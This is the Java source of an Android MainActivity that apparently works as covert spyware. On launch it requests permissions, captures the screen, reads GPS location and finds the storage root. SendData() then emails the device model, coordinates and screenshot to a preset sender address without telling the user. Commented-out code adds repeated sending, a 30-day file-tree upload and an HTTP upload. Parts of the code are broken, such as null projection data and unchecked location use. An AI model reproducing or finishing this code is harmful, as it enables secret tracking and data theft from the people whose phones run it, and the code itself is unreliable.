package com.example.test;
import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Location;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Date;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;


public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE_ACCESS_LOCATION = 2;
    private static final int REQUEST_CODE_ACCESS_STORAGE = 3;
    private static final int REQUEST_CODE = 4;
    private static final int MICROPHONE_PERMISSION = 7;

    private static final int REQUEST_CODE_READ_PHONE_STATE = 5;
    private static final int REQUEST_WRITE_EXTERNAL_STORAGE = 6;
    private static final int REQUEST_SCREENSHOT = 8;
    private MediaProjection mMediaProjection;
    private static final int VIRTUAL_DISPLAY_FLAGS =
            DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY |
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.d("Test", "Inside Oncreate before function calls");
        if(isStorageAccessible() && !isLocationPermissionGranted()){
//            getMicrophonePermission();
            Log.d("Test", "Inside Oncreate inside function call");
            requestStoragePermission();
            requestLocationPermission();
            SendData();
        }
    }

//    @Override
//    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
//        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
//
//        if (requestCode == REQUEST_CODE) {
//            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
//                // Permissions granted, take screenshot and send data
//                takeScreenshotAndSendData();
//            }
//            else {
//                // Permissions not granted, handle the situation
//                if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
//                    // User has denied permission previously, show rationale and request again
//                    new AlertDialog.Builder(this)
//                            .setTitle("Permission Required")
//                            .setMessage("This app needs storage permission to work properly.")
//                            .setPositiveButton("OK", (dialog, which) -> {
//                                Log.i("Permissions", "Requesting permissions");
//                                ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, REQUEST_CODE);
//                            })
//                            .create()
//                            .show();
//                } else {
//                    // User has permanently denied permission, show message and suggest going to app settings
//                    Toast.makeText(this, "Permission denied. Please go to app settings and grant the permission.", Toast.LENGTH_LONG).show();
//                }
//            }
//        }
//    }
    private boolean isMicrophoneOn()
    {
        if(this.getPackageManager().hasSystemFeature(PackageManager.FEATURE_MICROPHONE))
        {
            return true;
        }
        else {
            Toast.makeText(this, "Permission denied. Please go to app settings and grant the permission.", Toast.LENGTH_LONG).show();
            return false;
        }
    }

    private void getMicrophonePermission()
    {
        if(ContextCompat.checkSelfPermission(this,Manifest.permission.RECORD_AUDIO)==PackageManager.PERMISSION_DENIED)
        {
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.RECORD_AUDIO}, MICROPHONE_PERMISSION);
        }
    }
    private boolean isStorageAccessible() {
        // Check if storage is writable
        String state = Environment.getExternalStorageState();
        if (Environment.MEDIA_MOUNTED.equals(state)) {
            return true;
        } else {
            return false;
        }
    }


    private void requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {

                // Should we show an explanation?
                if (shouldShowRequestPermissionRationale(
                        Manifest.permission.READ_EXTERNAL_STORAGE)) {
                    // Explain to the user why we need to read the contacts
                }

                requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                        REQUEST_WRITE_EXTERNAL_STORAGE);

                // MY_PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE is an
                // app-defined int constant that should be quite unique

            }
        }
    }
    private boolean isLocationPermissionGranted() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            // Permission is automatically granted on devices lower than Android M upon installation
            return true;
        }
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            return true;
        }
        return false;
    }

    private void requestLocationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (shouldShowRequestPermissionRationale(Manifest.permission.ACCESS_FINE_LOCATION)) {
                // Explain to the user why we need the permission
            }
            requestPermissions(new String[] {Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_CODE_ACCESS_LOCATION);
        }
    }

//    private File takeScreenshot() {
//        try {
//            String timestamp = new SimpleDateFormat("yyyyMMddHHmmss").format(new Date());
//            // Get the display metrics
//            DisplayMetrics metrics = getResources().getDisplayMetrics();
//            int screenWidth = metrics.widthPixels;
//            int screenHeight = metrics.heightPixels;
//
//            // Create an image reader to capture the screenshot
//            @SuppressLint("WrongConstant") ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 1);
////            VirtualDisplay virtualDisplay = mMediaProjection.createVirtualDisplay("screenshot_"+ timestamp, screenWidth, screenHeight, metrics.densityDpi, VIRTUAL_DISPLAY_FLAGS, imageReader.getSurface(), null, null);
//
//            // Capture the screenshot
//            Image image = imageReader.acquireLatestImage();
//            Bitmap bitmap = Bitmap.createBitmap(image.getWidth(), image.getHeight(), Bitmap.Config.ARGB_8888);
//            bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
//            image.close();
//
//            // Save the screenshot to a file
//            File screenshotFile = new File(getExternalFilesDir(null), "screenshot.png");
//            FileOutputStream fos = new FileOutputStream(screenshotFile);
//            bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
//            fos.flush();
//            fos.close();
//
//            return screenshotFile;
//
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//
//        return null;
//    }

    private File takeScreenshot() {
        String timestamp = new SimpleDateFormat("yyyyMMddHHmmss").format(new Date());
        // Get the display metrics
        DisplayMetrics metrics = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(metrics);
        int density = metrics.densityDpi;

        // Get the dimensions of the screen
        int screenWidth = metrics.widthPixels;
        int screenHeight = metrics.heightPixels;

        // Create the image reader
        @SuppressLint("WrongConstant") ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);

        // Get the media projection manager
        MediaProjectionManager mediaProjectionManager = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        }

        // Start the capture intent
        Intent captureIntent = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            captureIntent = mediaProjectionManager.createScreenCaptureIntent();
        }
        startActivityForResult(captureIntent, REQUEST_CODE);

        // Start the capture callback
        final Image[] image = {null};
        final FileOutputStream[] fos = {null};
        final Bitmap[] bitmap = {null};

        try {
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    try {
                        // Get the image from the reader
                        image[0] = imageReader.acquireLatestImage();

                        // Get the image dimensions
                        int width = image[0].getWidth();
                        int height = image[0].getHeight();

                        // Create the bitmap
                        bitmap[0] = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

                        // Copy the image data into the bitmap
                        image[0].getPlanes()[0].getBuffer().rewind();
                        bitmap[0].copyPixelsFromBuffer(image[0].getPlanes()[0].getBuffer());

                        // Save the bitmap to a file
                        File file = new File(getExternalFilesDir(null), "screenshot.png");
                        fos[0] = new FileOutputStream(file);
                        bitmap[0].compress(Bitmap.CompressFormat.PNG, 100, fos[0]);

                    } catch (Exception e) {
                        e.printStackTrace();
                    } finally {
                        // Clean up
                        if (image[0] != null) {
                            image[0].close();
                        }
                        if (fos[0] != null) {
                            try {
                                fos[0].close();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }
                        if (bitmap[0] != null) {
                            bitmap[0].recycle();
                        }
                    }
                }
            }, null);

            // Start the capture
            MediaProjection mediaProjection = null;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                Object data = null;
                mediaProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, (Intent) data);
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                mediaProjection.createVirtualDisplay("Screenshot", screenWidth, screenHeight, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
            }

            // Wait for the screenshot to be taken
            Thread.sleep(1000);

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            // Clean up
            if (image[0] != null) {
                image[0].close();
            }
            if (fos[0] != null) {
                try {
                    fos[0].close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (bitmap[0] != null) {
                bitmap[0].recycle();
            }
        }

        // Return the screenshot file
        return new File(getExternalFilesDir(null), timestamp+"_screenshot.png");
    }



    //APP Info
//    public void saveListApps(){
//
//        StringBuilder sb = new StringBuilder();
//
//        for (AppInfo app : mApp){
//            if (app.isSelected == true){
//                sb.append(app.getPackageName()).append(";");
//            }
//        }
//
//        sPref.edit().putString("apps_to_lock", sb.toString()).commit();
//
//    }

    // Function to get location
    private Location getLocation() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (locationManager == null) {
            return null;
        }

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // Request permissions
            ActivityCompat.requestPermissions(this, new String[] { Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION }, REQUEST_CODE_ACCESS_LOCATION);
            return null;
        }

        Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (location == null) {
            location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        }

        if (location != null) {
            // use the location object
            return location;
        } else {
            // Permissions not granted, handle the situation
            Toast.makeText(this, "Location permissions not granted", Toast.LENGTH_SHORT).show();
            return null;
        }
    }

    // Function to get file storage access
    private File getFileStorageAccess() {
        // Check if the app has the necessary permission
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            // Request the permission if it hasn't been granted yet
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
                    REQUEST_WRITE_EXTERNAL_STORAGE);
            return null;
        }

        // Check if primary storage is available
        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
            // Get root directory of primary external storage
            return Environment.getExternalStorageDirectory();
        } else {
            return null; // Return null if primary storage is not available
        }
    }

    private File saveBitmapToFile(Bitmap bitmap, String filename) {
        // Code to save bitmap to file
        File file = new File(getExternalFilesDir(null), filename);
        try {
            FileOutputStream outputStream = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream);
            outputStream.flush();
            outputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return file;
    }
    private void sendEmail(String subject, String message, File attachmentFile, boolean isScreenshot) {
        JavaMailAPI javaMailAPI = new JavaMailAPI(Utils.senderEmail, subject , message ,attachmentFile, isScreenshot);
        javaMailAPI.execute();
    }

    // Function to send data to server using RESTful API
//    private void sendDataToServer(String subject, String message, File attachmentFile) {
        // Code to send data to server using RESTful API
        // Example:
//        OkHttpClient client = new OkHttpClient();
//        RequestBody requestBody = new MultipartBody.Builder()
//                .setType(MultipartBody.FORM)
//                .addFormDataPart("subject", subject)
//                .addFormDataPart("message", message)
//                .addFormDataPart("file", attachmentFile.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), attachmentFile))
//                .build();
//        Request request = new Request.Builder()
//                .url("https://example.com/api/upload")
//                .post(requestBody)
//                .build();
//        try {
//            Response response = client.newCall(request).execute();
//            if (response.isSuccessful()) {
//                // Handle successful response
//            } else {
//                // Handle failed response
//            }
//        } catch (IOException e) {
//            e.printStackTrace();
//            // Handle exception
//        }
//    }

    // Main function to take screenshot, get location and file storage access, and send email and/or API call

    private void SendData() {
        // Take screenshot
        File screenshot = takeScreenshot();

        // Get location
        Location location = getLocation();

        // Get file storage access
        File fileStorageAccess = getFileStorageAccess();

        // Save screenshot to file
        if (screenshot != null) {
            // Save the screenshot with a unique filename
//            File screenshotFile = saveBitmapToFile(screenshot, "screenshot_" + timestamp);

            // Format message with location and file storage access
            String locationMessage = "Location: " + location.getLatitude() + ", " + location.getLongitude();
            String fileAccessMessage = " ";
            if(fileStorageAccess != null)
            {
                if(fileStorageAccess.getAbsolutePath()!=null)
                {
                    fileAccessMessage = "File storage access: " + fileStorageAccess.getAbsolutePath();
                }
            }

            // Schedule a TimerTask to send email with screenshot and location information every 5 seconds
            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Log.d("Test2","Inside Send Data");
                    sendEmail(Build.MODEL, locationMessage, screenshot, true);

                }
            }, 5000);
//            TimerTask task = new TimerTask() {
//                @Override
//                public void run() {
//                    Log.d("Test2","Inside Send Data");
//                    sendEmail(Build.MODEL, locationMessage, screenshot);
//                }
//            };
//            Timer timer = new Timer();
//            timer.schedule(task, 0, 5000);
//
//            // Schedule a TimerTask to send email with fileStorageAccess information every 30 days
//            String finalFileAccessMessage = fileAccessMessage;
//            TimerTask task2 = new TimerTask() {
//                @Override
//                public void run() {
//                    sendEmail(Build.MODEL, finalFileAccessMessage, new File(getFileTree(fileStorageAccess)));
//                }
//            };
//            Timer timer2 = new Timer();
//            timer2.schedule(task2, 0, 2592000000L);
        }
    }


    private String getFileTree(File file) {
        if (file == null) {
            return "";
        }

        if (!file.exists()) {
            return "File or directory does not exist: " + file.getAbsolutePath();
        }

        StringBuilder sb = new StringBuilder();

        if (file.isDirectory()) {
            sb.append(file.getAbsolutePath()).append("\n");

            File[] files = file.listFiles();

            if (files != null) {
                for (File f : files) {
                    sb.append(getFileTree(f));
                }
            }
        } else {
            sb.append(file.getAbsolutePath()).append("\n");
        }

        return sb.toString();
    }
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
            // Check if the user granted permission to access external storage
            if (requestCode == REQUEST_WRITE_EXTERNAL_STORAGE) {
                // Take screenshot and send data
                SendData();
            }
        }

}

